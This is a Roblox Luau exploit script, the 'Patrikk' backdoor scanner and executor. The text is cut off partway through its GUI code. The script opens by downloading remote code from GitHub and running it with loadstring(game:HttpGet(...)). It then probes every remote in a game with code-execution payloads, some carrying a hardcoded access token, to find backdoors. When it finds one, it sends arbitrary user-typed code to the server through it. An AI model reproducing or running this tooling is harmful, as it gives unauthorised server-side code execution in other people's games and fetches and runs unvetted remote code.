loadstring(game:HttpGet("https://github.com/gregsixseven/sixone/blob/main/wl.luau?raw=true"))()


local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/gregsixseven/sixone/refs/heads/main/notification.luau", true))()

    local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local userInputService = game:GetService("UserInputService")
	local runService = game:GetService("RunService")
	local tweenService = game:GetService("TweenService")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	
	
	local EXCLUDED_REMOTES = {
		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
		GetServerVersion = true, GetClientId = true, GetInventory = true,
		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
		ReportAbuse = true
	}
	
	local SAFE_LOCATIONS = {
		["CoreGui"] = true,
		["ServerStorage"] = true,
		["ReplicatedFirst"] = true,
		["ServerScriptService"] = true
	}
	
	local foundExploit = false
	local FinishedFound = false
	local mode = 3
	local bg = 1
	local remoteEvent, remoteFunction
	local scanTime = 0
	
	local function isLikelyBackdoorRemote(remote)
		local name = remote.Name
		local parent = remote.Parent
	
	
		if SAFE_LOCATIONS[parent.ClassName] then
			return false
		end
		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
			return false
		end 
		if EXCLUDED_REMOTES[name] then
			return false
		end
		if name == "rbxAssetid_core__temp_3023g78" then
		        return false
		end
        if name == "rbx.bd_cssr6-O1" then 
                return false
        end
        if name == "_FEBYPASS32" then
                return false
        end
        if name == "rbx.bd_cssr6-01" then 
                return false
        end
        if name == "spunch.bd_cssr6-O1" then
                return false
        end
		if name == "ChatEvent" then
		        return false
		end
		if name == "AntiBackdoorScanner" then 
			    return false
		end
        if remote:GetAttribute("__VX_ROLE") == "EVENT" then
                return false
        end
		if parent.Parent.Name=='HDAdminHDClient' and remote.Parent.Name=='Signals' then
			return false
		end
		if parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
			return false
		end
		if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
			return false
		end
	
	
		return true
	end
	
	
	
		
	local function testRemote(remote, isFunction)
	if foundExploit then return false end
	if not isLikelyBackdoorRemote(remote) then return false end

	local modelName = "Patrikk_" .. tostring(os.clock()):gsub("%.", "")
	local rs = game:GetService("ReplicatedStorage")
	local foundEvent = false
	local testFlagName = "__Patrikk_test_flag_" .. tostring(os.clock()):gsub("%.", "")
	local globalPayload = "getgenv()." .. testFlagName .. " = true"

	local connection = rs.DescendantAdded:Connect(function(inst)
		if inst.Name == modelName then
			foundEvent = true
		end
	end)

	local function cleanup()
		connection:Disconnect()
		local f = rs:FindFirstChild(modelName)
		if f then f:Destroy() end
	end

	local success = pcall(function()
		local payload = [[
			local m=Instance.new("Folder")
			m.Name="]] .. modelName .. [["
			m.Parent=game:GetService("ReplicatedStorage")
		]]

		task.spawn(function()
			pcall(function()
				if isFunction then
					local ran = false
					pcall(function()
						local r = remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
						if r then ran = true end
					end)
					if not ran then
						pcall(function()
							local r = remote:InvokeServer(payload .. "\nreturn true")
							if r then ran = true end
						end)
					end
				   if not ran then 
                      pcall(function()
			            local r = remote:InvokeServer({
                                    token = "Scr1pt3dX_Acc3ss#XD!Private",
                                    code = payload .. "\nreturn true"  
                                  })
				          if r then ran = true end
		                end)
					end
					pcall(function()
						remote:InvokeServer(globalPayload)
					end)
				else
					remote:FireServer(payload)
					remote:FireServer(globalPayload)
				end
			end)
          end)
        end)
	local timeout = 1
	local start = os.clock()
	while os.clock() - start < timeout do
		if foundEvent or rs:FindFirstChild(modelName) then
			foundEvent = true
			break
		end
		task.wait(0)
	end

	local globalFlagTriggered = getgenv()[testFlagName] == true
	if globalFlagTriggered then
		getgenv()[testFlagName] = nil
	end

	cleanup()

	if (foundEvent or globalFlagTriggered) and not foundExploit then
		foundExploit = true
		if isFunction then
			remoteFunction = remote
		else
			remoteEvent = remote
		end
		return true
	end

	   return false
	end

local function findRemote()
    local trueStart = os.clock()
    foundExploit = false
    remoteEvent = nil
    remoteFunction = nil

    local remotes = {}
    for _, remote in ipairs(game:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            table.insert(remotes, remote)
        end
    end

    print(string.format("Patrikk BD: scanning %d remotes", #remotes))

    local MAX_CONCURRENT = 128
    local activeTasks = 0
    local taskDone = Instance.new("BindableEvent")

    local foundObject = nil

    for i = 1, #remotes do
        if foundExploit then break end

        while activeTasks >= MAX_CONCURRENT do
            taskDone.Event:Wait()
        end

        activeTasks += 1
        task.spawn(function()
            local ok, result = pcall(function()
                return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
            end)

            if ok and result then
                foundExploit = true
                foundObject = remotes[i]
                if remotes[i]:IsA("RemoteEvent") then
                    remoteEvent = remotes[i]
                else
                    remoteFunction = remotes[i]
                end
                print("Patrikk BD: ", remotes[i]:GetFullName())
            end

            activeTasks -= 1
            taskDone:Fire()
        end)
    end

    while activeTasks > 0 and not foundExploit do
        taskDone.Event:Wait()
    end

    scanTime = os.clock() - trueStart
    FinishedFound = true

    if not foundExploit then
       -- notify.Warn("Patrikk","No backdoor was found.")
    end

    print(string.format("Patrikk : scan completed in %.3f seconds", scanTime))
    
    return foundObject
end

	
function fireRemoteEvent(codes)
    local success = false
    local tried = 0
    local errors = {}

    local function try(func)
        tried += 1
        local ok, err = pcall(func)
        if ok then
            success = true
        else
            table.insert(errors, err)
        end
    end

    try(function()
        if remoteEvent then
            remoteEvent:FireServer(codes)
        end
    end)
    try(function()
        if remoteFunction then 
           remoteFunction:InvokeServer({
             token = "Scr1pt3dX_Acc3ss#XD!Private",
             code = codes
          })
        end
    end)
    try(function()
        if remoteFunction then
            remoteFunction:InvokeServer("starlightTSS", codes)
        end
    end)
    try(function()
        if remoteFunction then
            remoteFunction:InvokeServer(codes)
        end
    end)
    if not foundExploit then
        notify.Warn("Patrikk", "No backdoor.")
    elseif not success then
        notify.Warn("Patrikk", "RemoteEvent errors:")
        for _, err in ipairs(errors) do
            notify.Error(err)
        end
    end
end

local LMG2 = {};

LMG2["Scan_SpunchLOL_1"] = Instance.new("ScreenGui", game.CoreGui);
LMG2["Scan_SpunchLOL_1"]["Name"] = [[Scan_SpunchLOL]];
LMG2["Scan_SpunchLOL_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


LMG2["Frame_2"] = Instance.new("Frame", LMG2["Scan_SpunchLOL_1"]);
LMG2["Frame_2"]["BorderSizePixel"] = 0;
LMG2["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG2["Frame_2"]["Size"] = UDim2.new(0, 471, 0, 310);
LMG2["Frame_2"]["Position"] = UDim2.new(0, 332, 0, 210);


LMG2["UICorner_3"] = Instance.new("UICorner", LMG2["Frame_2"]);
LMG2["UICorner_3"]["CornerRadius"] = UDim.new(0, 6);


LMG2["UIStroke_4"] = Instance.new("UIStroke", LMG2["Frame_2"]);
LMG2["UIStroke_4"]["Transparency"] = 0.5;
LMG2["UIStroke_4"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["Frame_5"] = Instance.new("Frame", LMG2["Frame_2"]);
LMG2["Frame_5"]["BorderSizePixel"] = 0;
LMG2["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG2["Frame_5"]["Size"] = UDim2.new(0, 457, 0, 25);
LMG2["Frame_5"]["Position"] = UDim2.new(0, 8, 0, 10);


LMG2["UICorner_6"] = Instance.new("UICorner", LMG2["Frame_5"]);



LMG2["UIStroke_7"] = Instance.new("UIStroke", LMG2["Frame_5"]);
LMG2["UIStroke_7"]["Transparency"] = 0.5;
LMG2["UIStroke_7"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["TextLabel_8"] = Instance.new("TextLabel", LMG2["Frame_5"]);
LMG2["TextLabel_8"]["Active"] = true;
LMG2["TextLabel_8"]["BorderSizePixel"] = 0;
LMG2["TextLabel_8"]["TextSize"] = 15;
LMG2["TextLabel_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["TextLabel_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2["TextLabel_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["TextLabel_8"]["BackgroundTransparency"] = 1;
LMG2["TextLabel_8"]["RichText"] = true;
LMG2["TextLabel_8"]["Size"] = UDim2.new(0, 138, 0, 10);
LMG2["TextLabel_8"]["Text"] = [[<font color="#FF5680">Patrikk</font> - Private Backdoor |  Backdoor Scanner]];
LMG2["TextLabel_8"]["Position"] = UDim2.new(0, 110, 0, 7);


LMG2["ImageButton_9"] = Instance.new("ImageButton", LMG2["Frame_5"]);
LMG2["ImageButton_9"]["BorderSizePixel"] = 0;
LMG2["ImageButton_9"]["BackgroundTransparency"] = 1;
-- LMG2L["ImageButton_9"]["ImageContent"] = ;
LMG2["ImageButton_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["ImageButton_9"]["ImageColor3"] = Color3.fromRGB(231, 231, 231);
LMG2["ImageButton_9"]["Image"] = [[rbxassetid://110786993356448]];
LMG2["ImageButton_9"]["Size"] = UDim2.new(0, 24, 0, 24);
LMG2["ImageButton_9"]["Position"] = UDim2.new(0, 430, 0, 0);


LMG2["LocalScript_a"] = Instance.new("LocalScript", LMG2["ImageButton_9"]);



LMG2["ImageLabel_b"] = Instance.new("ImageLabel", LMG2["Frame_2"]);
LMG2["ImageLabel_b"]["BorderSizePixel"] = 0;
LMG2["ImageLabel_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["ImageLabel_b"]["ImageTransparency"] = 0.43;
-- LMG2L["ImageLabel_b"]["ImageContent"] = ;
LMG2["ImageLabel_b"]["Image"] = [[rbxassetid://80357785814661]];
LMG2["ImageLabel_b"]["Size"] = UDim2.new(0, 220, 0, 190);
LMG2["ImageLabel_b"]["BackgroundTransparency"] = 1;
LMG2["ImageLabel_b"]["Position"] = UDim2.new(0, 124, 0, 51);


LMG2["ScanButton_c"] = Instance.new("TextButton", LMG2["Frame_2"]);
LMG2["ScanButton_c"]["TextWrapped"] = true;
LMG2["ScanButton_c"]["RichText"] = true;
LMG2["ScanButton_c"]["BorderSizePixel"] = 0;
LMG2["ScanButton_c"]["TextSize"] = 20;
LMG2["ScanButton_c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["ScanButton_c"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG2["ScanButton_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2["ScanButton_c"]["BackgroundTransparency"] = 0.4;
LMG2["ScanButton_c"]["Size"] = UDim2.new(0, 240, 0, 90);
LMG2["ScanButton_c"]["Text"] = [[Scan Backdoor]];
LMG2["ScanButton_c"]["Name"] = [[ScanButton]];
LMG2["ScanButton_c"]["Position"] = UDim2.new(0, 114, 0, 110);


LMG2["UICorner_d"] = Instance.new("UICorner", LMG2["ScanButton_c"]);



LMG2["UIStroke_e"] = Instance.new("UIStroke", LMG2["ScanButton_c"]);
LMG2["UIStroke_e"]["Transparency"] = 0.5;
LMG2["UIStroke_e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2["UIStroke_e"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["Frame_f"] = Instance.new("Frame", LMG2["Frame_2"]);
LMG2["Frame_f"]["BorderSizePixel"] = 0;
LMG2["Frame_f"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG2["Frame_f"]["Size"] = UDim2.new(0, 457, 0, 25);
LMG2["Frame_f"]["Position"] = UDim2.new(0, 6, 0.8, 26);


LMG2["UICorner_10"] = Instance.new("UICorner", LMG2["Frame_f"]);
LMG2["UICorner_10"]["CornerRadius"] = UDim.new(0, 6);


LMG2["UIStroke_11"] = Instance.new("UIStroke", LMG2["Frame_f"]);
LMG2["UIStroke_11"]["Transparency"] = 0.5;
LMG2["UIStroke_11"]["Color"] = Color3.fromRGB(98, 98, 98);


LMG2["Credits_12"] = Instance.new("TextLabel", LMG2["Frame_f"]);
LMG2["Credits_12"]["BorderSizePixel"] = 0;
LMG2["Credits_12"]["TextSize"] = 15;
LMG2["Credits_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["Credits_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2["Credits_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2["Credits_12"]["BackgroundTransparency"] = 1;
LMG2["Credits_12"]["RichText"] = true;
LMG2["Credits_12"]["Size"] = UDim2.new(0, 92, 0, 16);
LMG2["Credits_12"]["Text"] = [[<font color="#FF5680">Patrikk</font> Backdoor Scanner | Made by Rig6?!?!?]];
LMG2["Credits_12"]["Name"] = [[Credits]];
LMG2["Credits_12"]["Position"] = UDim2.new(0, 130, 0, 4);

function EnableDrag(frame)
	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		
		-- Tweening for smoothness
		local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
		TweenService:Create(frame, tweenInfo, {Position = targetPos}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

task.spawn(function()
    EnableDrag(LMG2["Frame_2"])
end)

local function C_a()
	local script = LMG2["LocalScript_a"];
	script.Parent.MouseButton1Click:Connect(function()	
	     script.Parent.Parent.Parent.Parent:Destroy()	
	end)	
end;
task.spawn(C_a);
LMG2["ScanButton_c"].MouseButton1Click:Connect(function()
    notify.Info("Patrikk","Scanning backdoor..")
    findRemote()
    
    while not FinishedFound do
        task.wait(0.1)
    end
    
    if foundExploit then
    LMG2["Scan_SpunchLOL_1"]:Destroy()

LMG2L = {};
LMG2L["SpunchLOL_1"] = Instance.new("ScreenGui", game.CoreGui);
LMG2L["SpunchLOL_1"]["Name"] = [[SpunchLOL]];
LMG2L["SpunchLOL_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
LMG2L["SpunchLOL_1"]["ResetOnSpawn"] = false;

LMG2L["Main_2"] = Instance.new("Frame", LMG2L["SpunchLOL_1"]);
LMG2L["Main_2"]["BorderSizePixel"] = 0;
LMG2L["Main_2"]["BackgroundColor3"] = Color3.fromRGB(26, 27, 32);
LMG2L["Main_2"]["Size"] = UDim2.new(0, 471, 0, 310);
LMG2L["Main_2"]["Position"] = UDim2.new(0, 166, 0, 156);
LMG2L["Main_2"]["Name"] = [[Main]];

LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["Main_2"]);
LMG2L["UICorner_3"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_4"] = Instance.new("UIStroke", LMG2L["Main_2"]);
LMG2L["UIStroke_4"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_4"]["Transparency"] = 0.5;

LMG2L["Frame_5"] = Instance.new("Frame", LMG2L["Main_2"]);
LMG2L["Frame_5"]["BorderSizePixel"] = 0;
LMG2L["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(56, 56, 56);
LMG2L["Frame_5"]["Size"] = UDim2.new(0, 471, 0, 310);
LMG2L["Frame_5"]["BackgroundTransparency"] = 1;

LMG2L["hide_6"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["hide_6"]["BorderSizePixel"] = 0;
-- LMG2L["hide_6"]["Image"] = "rbxassetid://1000336";
LMG2L["hide_6"]["BackgroundColor3"] = Color3.fromRGB(17, 19, 22);
LMG2L["hide_6"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["hide_6"]["Name"] = [[hide]];
LMG2L["hide_6"]["AutoButtonColor"] = false;
LMG2L["hide_6"]["Position"] = UDim2.new(0, 309, 0, 271);

LMG2L["ImageLabelbla"] = Instance.new("ImageLabel", LMG2L["hide_6"]);
LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://3926307971";
LMG2L["ImageLabelbla"]["Size"] = UDim2.new(0, 25, 0, 25);
LMG2L["ImageLabelbla"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabelbla"]["Position"] = UDim2.new(0, 4, 0, 4);
LMG2L["ImageLabelbla"]["ImageRectOffset"] = Vector2.new(84, 44);
LMG2L["ImageLabelbla"]["ImageRectSize"] = Vector2.new(36, 36);

LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["hide_6"]);
LMG2L["UICorner_7"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["LocalScript_8"] = Instance.new("LocalScript", LMG2L["hide_6"]);

LMG2L["UIStroke_9"] = Instance.new("UIStroke", LMG2L["hide_6"]);
LMG2L["UIStroke_9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_9"]["Thickness"] = 1;
LMG2L["UIStroke_9"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_9"]["Transparency"] = 0.5;

LMG2L["UICorner_a"] = Instance.new("UICorner", LMG2L["Frame_5"]);
LMG2L["UICorner_a"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["ImageButton2_b"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["ImageButton2_b"]["BorderSizePixel"] = 0;
LMG2L["ImageButton2_b"]["BackgroundColor3"] = Color3.fromRGB(17, 19, 22);
LMG2L["ImageButton2_b"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["ImageButton2_b"]["Name"] = [[ImageButton2]];
LMG2L["ImageButton2_b"]["AutoButtonColor"] = false;
LMG2L["ImageButton2_b"]["Position"] = UDim2.new(0, 389, 0, 271);

LMG2L["ImageLabella"] = Instance.new("ImageLabel", LMG2L["ImageButton2_b"]);
LMG2L["ImageLabella"]["Image"] = "rbxassetid://7072721335";
LMG2L["ImageLabella"]["Size"] = UDim2.new(0, 22, 0, 22);
LMG2L["ImageLabella"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabella"]["Position"] = UDim2.new(0, 6, 0, 6);

LMG2L["LocalScript_ni"] = Instance.new("LocalScript", LMG2L["ImageButton2_b"])

LMG2L["UICorner_c"] = Instance.new("UICorner", LMG2L["ImageButton2_b"]);
LMG2L["UICorner_c"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_d"] = Instance.new("UIStroke", LMG2L["ImageButton2_b"]);
LMG2L["UIStroke_d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_d"]["Thickness"] = 1;
LMG2L["UIStroke_d"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_d"]["Transparency"] = 0.5;

LMG2L["clr_e"] = Instance.new("TextButton", LMG2L["Frame_5"]);
LMG2L["clr_e"]["TextStrokeTransparency"] = 0;
LMG2L["clr_e"]["BorderSizePixel"] = 0;
LMG2L["clr_e"]["TextSize"] = 16;
LMG2L["clr_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["clr_e"]["BackgroundColor3"] = Color3.fromRGB(17, 19, 22);
LMG2L["clr_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG2L["clr_e"]["Size"] = UDim2.new(0, 100, 0, 33);
LMG2L["clr_e"]["Text"] = [[Clear]];
LMG2L["clr_e"]["AutoButtonColor"] = false;
LMG2L["clr_e"]["Name"] = [[clr]];
LMG2L["clr_e"]["Position"] = UDim2.new(0, 148, 0, 272);

LMG2L["UICorner_f"] = Instance.new("UICorner", LMG2L["clr_e"]);
LMG2L["UICorner_f"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["LocalScript_10"] = Instance.new("LocalScript", LMG2L["clr_e"]);

LMG2L["UIStroke_11"] = Instance.new("UIStroke", LMG2L["clr_e"]);
LMG2L["UIStroke_11"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_11"]["Thickness"] = 1;
LMG2L["UIStroke_11"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_11"]["Transparency"] = 0.5;

LMG2L["ImageButton_12"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["ImageButton_12"]["BorderSizePixel"] = 0;
LMG2L["ImageButton_12"]["BackgroundColor3"] = Color3.fromRGB(17, 19, 22);
LMG2L["ImageButton_12"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["ImageButton_12"]["Position"] = UDim2.new(0, 429, 0, 271);
LMG2L["ImageButton_12"]["AutoButtonColor"] = false;

LMG2L["LocalScript_r6"] = Instance.new("LocalScript", LMG2L["ImageButton_12"])

LMG2L["ImageLabel2"] = Instance.new("ImageLabel", LMG2L["ImageButton_12"]);
LMG2L["ImageLabel2"]["Image"] = "rbxassetid://4941166750";
LMG2L["ImageLabel2"]["Size"] = UDim2.new(0, 27, 0, 27);
LMG2L["ImageLabel2"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabel2"]["Position"] = UDim2.new(0, 3, 0, 3);

LMG2L["UICorner_13"] = Instance.new("UICorner", LMG2L["ImageButton_12"]);
LMG2L["UICorner_13"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_14"] = Instance.new("UIStroke", LMG2L["ImageButton_12"]);
LMG2L["UIStroke_14"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_14"]["Thickness"] = 1;
LMG2L["UIStroke_14"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_14"]["Transparency"] = 0.5;

LMG2L["EditorScroll"] = Instance.new("ScrollingFrame", LMG2L["Frame_5"]);
LMG2L["EditorScroll"]["Name"] = [[EditorScroll]];
LMG2L["EditorScroll"]["Active"] = true;
LMG2L["EditorScroll"]["BackgroundColor3"] = Color3.fromRGB(6, 6, 6);
LMG2L["EditorScroll"]["BackgroundTransparency"] = 0.5;
LMG2L["EditorScroll"]["BorderSizePixel"] = 0;
LMG2L["EditorScroll"]["Position"] = UDim2.new(0, 6, 0, 42); 
LMG2L["EditorScroll"]["Size"] = UDim2.new(0, 458, 0, 223);
LMG2L["EditorScroll"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
LMG2L["EditorScroll"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
LMG2L["EditorScroll"]["ScrollBarThickness"] = 1;
LMG2L["EditorScroll"]["ZIndex"] = 5;

LMG2L["UIStroke_16"] = Instance.new("UIStroke", LMG2L["EditorScroll"]);
LMG2L["UIStroke_16"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_16"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_16"]["Transparency"] = 0.5;

LMG2L["UICorner_17"] = Instance.new("UICorner", LMG2L["EditorScroll"]);
LMG2L["UICorner_17"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["Editor_15"] = Instance.new("TextBox", LMG2L["EditorScroll"]);
LMG2L["Editor_15"]["Name"] = [[Editor]];
LMG2L["Editor_15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["Editor_15"]["PlaceholderColor3"] = Color3.fromRGB(204, 204, 204);
LMG2L["Editor_15"]["ZIndex"] = 5;
LMG2L["Editor_15"]["BorderSizePixel"] = 0;
LMG2L["Editor_15"]["TextSize"] = 15;
LMG2L["Editor_15"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
LMG2L["Editor_15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["Editor_15"]["BackgroundColor3"] = Color3.fromRGB(17, 19, 22);
LMG2L["Editor_15"]["RichText"] = true;
LMG2L["Editor_15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Editor_15"]["MultiLine"] = true;
LMG2L["Editor_15"]["ClearTextOnFocus"] = false;
LMG2L["Editor_15"]["PlaceholderText"] = [[-- boi what the helly 67]];
LMG2L["Editor_15"]["Size"] = UDim2.new(1, -8, 0, 210);
LMG2L["Editor_15"]["Position"] = UDim2.new(0, 4, 0, 4);
LMG2L["Editor_15"]["Text"] = [[]];
LMG2L["Editor_15"]["BackgroundTransparency"] = 1;
LMG2L["Editor_15"]["AutomaticSize"] = Enum.AutomaticSize.Y;

LMG2L["Editor_15"]["Position"] = UDim2.new(0, 40, 0, 4); 
LMG2L["Editor_15"]["Size"] = UDim2.new(1, -45, 0, 210);

-- 1. Setup the LineNumbers Label with AutomaticSize
LMG2L["LineNumbers"] = Instance.new("TextLabel", LMG2L["EditorScroll"]);
LMG2L["LineNumbers"]["Name"] = [[LineNumbers]];
LMG2L["LineNumbers"]["BackgroundTransparency"] = 1;
LMG2L["LineNumbers"]["TextColor3"] = Color3.fromRGB(255,255,255);
LMG2L["LineNumbers"]["TextSize"] = 15;
LMG2L["LineNumbers"]["FontFace"] = LMG2L["Editor_15"]["FontFace"];
LMG2L["LineNumbers"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["LineNumbers"]["TextXAlignment"] = Enum.TextXAlignment.Right;
LMG2L["LineNumbers"]["ZIndex"] = 1000;

-- KEY CHANGES FOR INFINITE HEIGHT:
LMG2L["LineNumbers"]["Size"] = UDim2.new(0, 30, 0, 0); -- Height 0, but...
LMG2L["LineNumbers"]["AutomaticSize"] = Enum.AutomaticSize.Y; -- ...it grows with text
LMG2L["LineNumbers"]["Position"] = UDim2.new(0, 0, 0, 4);
LMG2L["LineNumbers"]["Text"] = [[1]];

-- 2. Ensure the Editor doesn't wrap (Wrapping breaks line number alignment)
LMG2L["Editor_15"]["TextWrapped"] = false;

-- 3. Optimized Line Counter
local function UpdateLineNumbers()
    local text = LMG2L["Editor_15"].Text
    -- Count newlines efficiently
    local _, lineCount = text:gsub("\n", "\n")
    lineCount = lineCount + 1
    
    -- Create the vertical list of numbers
    local t = {}
    for i = 1, lineCount do
        table.insert(t, i)
    end
    
    LMG2L["LineNumbers"].Text = table.concat(t, "\n")
end

-- 4. Listen for changes
LMG2L["Editor_15"]:GetPropertyChangedSignal("Text"):Connect(UpdateLineNumbers)

LMG2L["Title_18"] = Instance.new("Frame", LMG2L["Frame_5"]);
LMG2L["Title_18"]["BorderSizePixel"] = 0;
LMG2L["Title_18"]["BackgroundColor3"] = Color3.fromRGB(25, 26, 31);
LMG2L["Title_18"]["Size"] = UDim2.new(0, 457, 0, 25);
LMG2L["Title_18"]["Position"] = UDim2.new(0, 6, 0, 6);
LMG2L["Title_18"]["Name"] = [[Title]];

LMG2L["close_19"] = Instance.new("ImageButton", LMG2L["Title_18"]);
LMG2L["close_19"]["BorderSizePixel"] = 0;
LMG2L["close_19"]["Image"] = "rbxassetid://110786993356448";
LMG2L["close_19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["close_19"]["ImageColor3"] = Color3.fromRGB(230, 230, 230);
LMG2L["close_19"]["BackgroundTransparency"] = 1;
LMG2L["close_19"]["Size"] = UDim2.new(0, 24, 0, 24);
LMG2L["close_19"]["Name"] = [[close]];
LMG2L["close_19"]["Position"] = UDim2.new(0, 430, 0, 0);

LMG2L["LocalScript_1a"] = Instance.new("LocalScript", LMG2L["close_19"]);

LMG2L["UICorner_1b"] = Instance.new("UICorner", LMG2L["Title_18"]);
LMG2L["UICorner_1b"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["TextLabel_1c"] = Instance.new("TextLabel", LMG2L["Title_18"]);
LMG2L["TextLabel_1c"]["BorderSizePixel"] = 0;
LMG2L["TextLabel_1c"]["TextSize"] = 18;
LMG2L["TextLabel_1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
LMG2L["TextLabel_1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_1c"]["BackgroundTransparency"] = 1;
LMG2L["TextLabel_1c"]["RichText"] = true;
LMG2L["TextLabel_1c"]["Size"] = UDim2.new(0, 138, 0, 11);
LMG2L["TextLabel_1c"]["Text"] = [[ <font color="#FF5680">patrik</font> - Private Backdoor ]];
